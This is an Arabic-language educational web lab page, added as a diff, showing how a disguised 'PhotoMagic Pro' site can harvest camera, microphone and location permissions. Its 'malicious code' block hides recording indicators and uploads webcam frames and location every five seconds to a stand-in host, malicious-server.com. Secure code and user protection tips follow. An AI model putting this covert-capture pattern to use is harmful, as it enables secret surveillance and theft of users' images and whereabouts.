@@ -1,0 +1,198 @@
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>مختبر 05: الوصول للكاميرا | ورشة مهندسين المستقبل</title><link rel="stylesheet" href="../css/styles.css"><link rel="stylesheet" href="../css/animations.css"><link rel="stylesheet" href="../css/labs.css"><link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;500;700&family=Source+Code+Pro:wght@400;600&display=swap" rel="stylesheet"><!-- Arabic Fonts --><link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=Tajawal:wght@400;500;700&family=Noto+Sans+Arabic:wght@400;500;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="../css/arabic-fixes.css"><style>
+        /* Arabic RTL Support */
+        html[lang="ar"] {
+            direction: rtl;
+            text-align: right;
+        }
+        
+        html[lang="ar"] body {
+            font-family: 'Cairo', 'Tajawal', 'Noto Sans Arabic', sans-serif !important;
+            direction: rtl;
+            text-align: right;
+        }
+        
+        html[lang="ar"] .message-text,
+        html[lang="ar"] .lab-description,
+        html[lang="ar"] .slide-body p,
+        html[lang="ar"] .hint,
+        html[lang="ar"] h1, h2, h3, h4, h5, h6 {
+            direction: rtl;
+            text-align: right;
+            unicode-bidi: embed;
+        }
+        
+        html[lang="ar"] input[type="text"],
+        html[lang="ar"] textarea {
+            direction: rtl;
+            text-align: right;
+        }
+        
+        html[lang="ar"] .nav-back {
+            float: right;
+        }
+        
+        html[lang="ar"] .labs-grid,
+        html[lang="ar"] .ai-labs-grid {
+            direction: rtl;
+        }
+        
+        html[lang="ar"] .quick-prompts,
+        html[lang="ar"] .capability-item,
+        html[lang="ar"] .option-group {
+            text-align: right;
+        }
+        
+        /* Fix button alignment for RTL */
+        html[lang="ar"] .genre-buttons,
+        html[lang="ar"] .setting-buttons,
+        html[lang="ar"] .style-buttons {
+            justify-content: flex-end;
+        }
+        
+        /* Ensure proper Arabic text rendering */
+        html[lang="ar"] * {
+            font-kerning: auto;
+            text-rendering: optimizeLegibility;
+            -webkit-font-feature-settings: "kern" 1, "liga" 1, "calt" 1;
+            font-feature-settings: "kern" 1, "liga" 1, "calt" 1;
+        }
+    </style></head><body><div class="lab-grid-bg"></div><div class="cyber-particles"></div><!-- Language Toggle --><nav class="lab-nav"><a href="../cyber-home.html" class="nav-back"><span>العودة للمختبرات →</span></a><h1 class="nav-title"><span>مختبر 05: الوصول للكاميرا</span></h1><div class="lab-timer">00:00:00</div></nav><main class="lab-container"><!-- View Toggle --><div class="view-toggle"><button class="toggle-btn active" onclick="switchView('hacker')"><span class="icon">💀</span><span>عرض الهاكر</span></button><button class="toggle-btn" onclick="switchView('developer')"><span class="icon">🛡️</span><span>عرض المطور</span></button></div><!-- Lab Introduction --><section class="lab-intro"><h2 class="section-header"><span>استغلال أذونات الجهاز</span></h2><p class="lab-description"><span>يوضح هذا المختبر كيف يمكن للمواقع الضارة استغلال أذونات الجهاز للوصول إلى الكاميرات 
+                والميكروفونات والأجهزة الحساسة الأخرى دون وعي مناسب من المستخدم.</span></p><div class="threat-level"><span>مستوى التهديد:</span><div class="threat-bar high"></div><span class="threat-text high"><span>عالي</span></span></div></section><!-- Hacker View --><section id="hacker-view" class="view-section active"><div class="terminal-header"><span class="terminal-title"><span>طرفية الهاكر</span></span><div class="terminal-controls"><span class="control red"></span><span class="control yellow"></span><span class="control green"></span></div></div><div class="hacker-content"><div class="scenario-box"><h3><span>📋 السيناريو</span></h3><p><span>لقد أنشأت موقع ويب ضار يخدع المستخدمين لمنح أذونات الكاميرا والميكروفون.</span></p><p></span><span>الهدف: <code>مستخدمون غير مشتبهين يزورون "تطبيق الكاميرا الممتع"</code></span></p></div><div class="exploit-steps"><h3><span>📷 استغلال الوصول للجهاز</span></h3><div class="step"><span class="step-number">01</span><div class="step-content"><h4><span>إعداد الهندسة الاجتماعية</span></h4><div class="social-setup"><p><span>إنشاء طلب مزيف يبدو شرعياً:</span></p><div class="fake-app-preview"><div class="fake-app-header"><span class="app-icon">📸</span><span class="app-name">PhotoMagic Pro</span></div><p class="fake-description"><span>التقط صور مذهلة بفلاتر الذكاء الاصطناعي!</span></p><button onclick="requestCameraAccess()" class="fake-allow-btn"><span>📷 السماح بالوصول للكاميرا</span></button></div></div></div></div><div class="step"><span class="step-number">02</span><div class="step-content"><h4><span>حصاد الأذونات</span></h4><div class="permission-status" id="permission-status"><div class="permission-item"><span class="permission-name">📷 الكاميرا</span><span class="permission-state" id="camera-state">لم يتم الطلب</span></div><div class="permission-item"><span class="permission-name">🎤 الميكروفون</span><span class="permission-state" id="microphone-state">لم يتم الطلب</span></div><div class="permission-item"><span class="permission-name">📍 الموقع</span><span class="permission-state" id="location-state">لم يتم الطلب</span></div></div><button onclick="requestAllPermissions()" class="cyber-btn">
+                                🎯 طلب جميع الأذونات
+                            </button></div></div><div class="step"><span class="step-number">03</span><div class="step-content"><h4><span>محاكاة المراقبة</span></h4><div class="surveillance-panel"><div class="camera-feed"><video id="camera-preview" autoplay muted></video><div class="camera-overlay"><div class="recording-indicator" id="recording-indicator"><span class="red-dot"></span><span>تسجيل</span></div><div class="camera-info"><div><span>الدقة:</span><span id="resolution">N/A</span></div><div><span>معدل الإطارات:</span><span id="fps">N/A</span></div></div></div></div><div class="surveillance-controls"><button onclick="startSurveillance()" class="cyber-btn" id="surveillance-btn"><span>🔴 بدء المراقبة</span></button><button onclick="captureFrame()" class="cyber-btn" id="capture-btn" disabled><span>📸 التقاط إطار</span></button><button onclick="toggleAudio()" class="cyber-btn" id="audio-btn" disabled><span>🎤 مراقبة الصوت</span></button></div></div></div></div><div class="step"><span class="step-number">04</span><div class="step-content"><h4><span>استخراج البيانات</span></h4><div class="exfiltration-panel"><div class="captured-data" id="captured-data"><div class="data-header"><span>📊 البيانات المحصودة</span></div><div class="data-list" id="data-list"><p class="no-data"><span>لم يتم التقاط أي بيانات بعد...</span></p></div></div><div class="exfil-stats"><div class="stat"><span class="label"><span>الإطارات المحصودة:</span></span><span id="frame-count">0</span></div><div class="stat"><span class="label"><span>عينات الصوت:</span></span><span id="audio-count">0</span></div><div class="stat"><span class="label"><span>تحديثات الموقع:</span></span><span id="location-count">0</span></div></div></div></div></div></div><div class="success-indicator" id="success-indicator"><span class="icon">👁️</span><span><span>المراقبة نشطة!</span></span></div></div></section><!-- Developer View --><section id="developer-view" class="view-section"><div class="terminal-header"><span class="terminal-title"><span>طرفية المطور</span></span><div class="terminal-controls"><span class="control red"></span><span class="control yellow"></span><span class="control green"></span></div></div><div class="developer-content"><div class="vulnerability-explanation"><h3><span>🐛 ثغرات أذونات الجهاز</span></h3><p><span>توفر المتصفحات الحديثة واجهات برمجة قوية للوصول إلى أجهزة الجهاز، لكن يمكن استغلالها:</span></p><div class="vulnerable-code"><h4><span>❌ كود ضار</span></h4><pre class="code-block language-javascript">
+// سيء: طلبات أذونات خادعة
+function requestCameraAccess() {
+    // التنكر بزي تطبيق شرعي
+    document.title = "PhotoMagic Pro - جاري التحميل...";
+    
+    // طلب الأذونات بدوع غرض واضح
+    navigator.mediaDevices.getUserMedia({
+        video: { 
+            width: 1920, 
+            height: 1080,
+            facingMode: "user"
+        },
+        audio: true
+    }).then(stream => {
+        // بدء التسجيل بدوع علم المستخدم
+        const video = document.getElementById('hiddenVideo');
+        video.srcObject = stream;
+        
+        // إرسال البيانات إلى خادم المهاجم
+        recordAndUpload(stream);
+        
+        // إخفاء حقيقة أن الكاميرا نشطة
+        hideRecordingIndicators();
+    });
+}
+
+// التقاط الإطارات باستمرار
+function recordAndUpload(stream) {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    
+    setInterval(() => {
+        // تقاط إطار كل 5 ثواني
+        ctx.drawImage(video, 0, 0);
+        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+        
+        // إرسال إلى خادم المهاجم
+        fetch('https://malicious-server.com/upload', {
+            method: 'POST',
+            body: JSON.stringify({
+                image: imageData,
+                timestamp: Date.now(),
+                userAgent: navigator.userAgent,
+                location: getCurrentLocation()
+            })
+        });
+    }, 5000);
+}</pre></div></div><div class="secure-implementation"><h3>🛡️ SECURE IMPLEMENTATION</h3><div class="secure-code"><h4>✅ SECURE CODE</h4><pre class="code-block language-javascript">
+// جيد: معالجة أذونات شفافة
+class SecureMediaHandler {
+    constructor() {
+        this.stream = null;
+        this.isRecording = false;
+        this.userConsent = false;
+    }
+    
+    async requestPermissions() {
+        // شرح واضح لما سيتم الوصول إليه
+        const consent = await this.showConsentDialog({
+            title: "مطلوب الوصول للكاميرا",
+            message: "يحتاج هذا التطبيق للوصول للكاميرا لالتقاط الصور. خصوصيتك محمية:",
+            details: [
+                "• يتم التقاط الصور فقط عند نقر زر التقاط",
+                "• لا يتم إرسال البيانات لخوادم خارجية",
+                "• يمكنك إلغاء الوصول في أي وقت",
+                "• مؤشر التسجيل سيظهر دائماً"
+            ]
+        });
+        
+        if (!consent) {
+            throw new Error('رفض المستخدم الموافقة');
+        }
+        
+        try {
+            // طلب الحد الأدنى من الأذونات الضرورية
+            this.stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    width: { ideal: 640 },
+                    height: { ideal: 480 },
+                    facingMode: "user"
+                },
+                audio: false // طلب فقط عند الحاجة الفعلية
+            });
+            
+            this.userConsent = true;
+            this.showPermissionStatus();
+            return this.stream;
+            
+        } catch (error) {
+            this.handlePermissionError(error);
+            throw error;
+        }
+    }
+    
+    showPermissionStatus() {
+        // Always show clear indicators
+        const indicator = document.createElement('div');
+        indicator.className = 'camera-active-indicator';
+        indicator.innerHTML = `
+            <div class="indicator-content"><span class="camera-icon">📷</span><span>Camera Active</span><button onclick="this.revokePermissions()">Stop</button></div>
+        `;
+        document.body.appendChild(indicator);
+    }
+    
+    capturePhoto() {
+        if (!this.userConsent || !this.stream) {
+            throw new Error('No permission or stream available');
+        }
+        
+        // Only capture when explicitly requested
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const video = document.getElementById('videoElement');
+        
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        
+        // Process locally, don't upload automatically
+        return canvas.toDataURL('image/jpeg', 0.9);
+    }
+    
+    revokePermissions() {
+        if (this.stream) {
+            // Stop all tracks
+            this.stream.getTracks().forEach(track => track.stop());
+            this.stream = null;
+        }
+        
+        this.userConsent = false;
+        this.removeIndicators();
+        
+        // Clear any stored data
+        this.clearCapturedData();
+    }
+}</pre></div><div class="security-measures"><h4>🔒 PROTECTION STRATEGIES</h4><div class="protection-grid"><div class="protection-card"><h5>Permission Transparency</h5><ul><li>Clear explanation of data usage</li><li>Visible recording indicators</li><li>Easy revocation options</li></ul></div><div class="protection-card"><h5>Minimal Access Principle</h5><ul><li>Request only necessary permissions</li><li>Use lowest required quality</li><li>Limit access duration</li></ul></div><div class="protection-card"><h5>User Control</h5><ul><li>Explicit consent for each use</li><li>Clear stop/revoke buttons</li><li>No background recording</li></ul></div><div class="protection-card"><h5>Data Protection</h5><ul><li>Local processing when possible</li><li>Encrypted transmission if needed</li><li>No unauthorized storage</li></ul></div></div></div></div><div class="user-protection"><h3>🛡️ USER PROTECTION GUIDE</h3><div class="protection-tips"><div class="tip-item"><span class="icon">🔍</span><strong>Check URL Bar:</strong><p>Look for camera/microphone icons indicating active access</p></div><div class="tip-item"><span class="icon">⚙️</span><strong>Browser Settings:</strong><p>Review and manage site permissions regularly</p><code>chrome://settings/content/camera</code></div><div class="tip-item"><span class="icon">🚫</span><strong>Default Deny:</strong><p>Set browser to ask for permission every time</p></div><div class="tip-item"><span class="icon">📱</span><strong>Mobile Awareness:</strong><p>Mobile browsers also request device permissions</p></div></div></div><div class="browser-security"><h3>🔒 BROWSER SECURITY FEATURES</h3><div class="security-features"><div class="feature"><h5>Permission Prompts</h5><p>Modern browsers always ask before granting camera/microphone access</p></div><div class="feature"><h5>Visual Indicators</h5><p>Camera/microphone icons appear in address bar when active</p></div><div class="feature"><h5>HTTPS Requirement</h5><p>Device access APIs only work on secure (HTTPS) connections</p></div><div class="feature"><h5>Permission Management</h5><p>Users can revoke permissions at any time through browser settings</p></div></div></div></div></section><!-- Lab Progress --><div class="lab-progress"><div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div><div class="progress-steps"><div class="step-indicator active">Setup</div><div class="step-indicator">Request</div><div class="step-indicator">Access</div><div class="step-indicator">Protect</div></div></div></main><script src="../js/lab-common.js"></script><script src="../js/lab5-camera.js"></script></body></html> 
